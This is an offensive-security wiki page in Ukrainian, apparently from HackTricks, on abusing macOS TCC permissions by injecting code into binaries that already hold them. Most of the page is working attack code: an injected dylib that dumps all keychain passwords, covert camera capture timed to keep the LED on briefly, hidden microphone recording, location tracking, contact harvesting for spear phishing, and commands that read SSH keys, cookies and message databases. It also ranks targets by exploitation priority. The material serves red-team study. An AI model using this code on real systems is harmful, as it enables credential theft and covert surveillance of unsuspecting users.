# Викрадення облікових даних і даних у macOS через дозволи TCC

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

macOS TCC (Transparency, Consent, and Control) захищає доступ до конфіденційних даних користувача. Якщо attacker **компрометує binary, який уже має дозволи TCC**, він успадковує ці дозволи. На цій сторінці описано потенціал exploitation кожного дозволу TCC, пов’язаного з викраденням даних.<sup>[[2]](#references)</sup>

> [!WARNING]
> Code injection у binary із дозволом TCC (через DYLD injection, dylib hijacking або task port) **непомітно успадковує всі його дозволи TCC**. Коли той самий process читає захищені дані, додатковий prompt або verification не з’являється.<sup>[[4]](#references)</sup>

---

## Групи доступу Keychain

### Здобич

macOS Keychain зберігає:
- **Паролі Wi-Fi** — усі збережені облікові дані бездротових мереж
- **Паролі вебсайтів** — паролі Safari, Chrome (коли використовується Keychain) та інших browser
- **Паролі application** — облікові записи email, облікові дані VPN, development tokens
- **Сертифікати та приватні ключі** — code signing, client TLS, шифрування S/MIME
- **Secure notes** — секрети, збережені користувачем

### Entitlement: `keychain-access-groups`

Елементи Keychain організовані в **групи доступу**. Entitlement `keychain-access-groups` application містить перелік груп, до яких він може отримувати доступ:<sup>[[1]](#references)</sup>
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Експлуатація
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Доступ до камери (kTCCServiceCamera)

### Exploitation

Бінарний файл із дозволом TCC на доступ до камери (через `kTCCServiceCamera` або entitlement `com.apple.security.device.camera`) може робити фото та записувати відео:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Починаючи з **macOS Sonoma**, індикатор камери в рядку меню є постійним, і його неможливо програмно приховати. У **старіших версіях macOS** короткочасне захоплення може не спричинити помітної індикації.

---

## Доступ до мікрофона (kTCCServiceMicrophone)

### Exploitation

Доступ до мікрофона захоплює весь звук із вбудованого мікрофона, гарнітури або підключених пристроїв аудіовведення:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Атака: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Відстеження місцезнаходження (kTCCServiceLocation)

### Експлуатація
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Безперервне відстеження
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Контакти / Календар / Фото

### Exfiltration персональних даних

| TCC Service | Framework | Дані |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Імена, електронні адреси, телефони, адреси |
| `kTCCServiceCalendar` | `EventKit` | Зустрічі, учасники, місцезнаходження |
| `kTCCServicePhotos` | `Photos.framework` | Фото, знімки екрана, метадані місцезнаходження |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Збір контактів
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Доступ до облікового запису iCloud

### Entitlement: `com.apple.private.icloud-account-access`

Цей entitlement дає змогу взаємодіяти з XPC-сервісом `com.apple.iCloudHelper`, забезпечуючи доступ до:
- **Токенів iCloud** — токенів автентифікації Apple ID користувача
- **iCloud Drive** — синхронізованих документів з усіх пристроїв
- **iCloud Keychain** — паролів, синхронізованих на всіх пристроях Apple
- **Find My** — місцезнаходження всіх пристроїв Apple користувача<sup>[[3]](#references)</sup>
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Компрометація бінарного файлу з правами iCloud розширює атаку з **одного пристрою на всю екосистему Apple**: інші Mac, iPhone, iPad, Apple Watch. Синхронізація iCloud Keychain означає, що паролі з усіх пристроїв стають доступними.

---

## Full Disk Access (kTCCServiceSystemPolicyAllFiles)

### Найпотужніший дозвіл TCC

Full Disk Access надає можливість читати **кожен файл у системі**, зокрема:
- Дані інших застосунків (Messages, Mail, історія Safari)
- Бази даних TCC (розкривають усі інші дозволи)
- SSH-ключі та конфігурацію
- Cookies браузерів і токени сесій
- Бази даних і кеші застосунків
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Матриця пріоритетів експлуатації

Під час оцінювання бінарних файлів із можливістю ін'єкції, яким надано дозволи TCC, визначайте пріоритет за цінністю даних:

| Пріоритет | Дозвіл TCC | Причина |
|---|---|---|
| **Критичний** | Full Disk Access | Доступ до всього |
| **Критичний** | TCC Manager | Може надати будь-який дозвіл |
| **Високий** | Keychain Access Groups | Усі збережені паролі |
| **Високий** | iCloud Account Access | Компрометація кількох пристроїв |
| **Високий** | Input Monitoring (ListenEvent) | Keylogging |
| **Високий** | Accessibility | Керування GUI, самостійне надання дозволів |
| **Середній** | Screen Capture | Захоплення візуальних даних |
| **Середній** | Camera + Microphone | Surveillance |
| **Середній** | Contacts + Calendar | Дані для social engineering |
| **Низький** | Location | Фізичне відстеження |
| **Низький** | Photos | Особисті дані |

## Скрипт переліку
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## References

- [1] [Apple Developer — Сервіси Keychain](https://developer.apple.com/documentation/security/keychain_services)
- [2] [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
- [3] [OBTS v5.0 — «Що відбувається на вашому Mac, залишається в iCloud Apple?!» (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [4] [Objective-See — Експлуатація TCC](https://objective-see.org/blog/blog_0x4C.html)
{{#include ../../../../banners/hacktricks-training.md}}
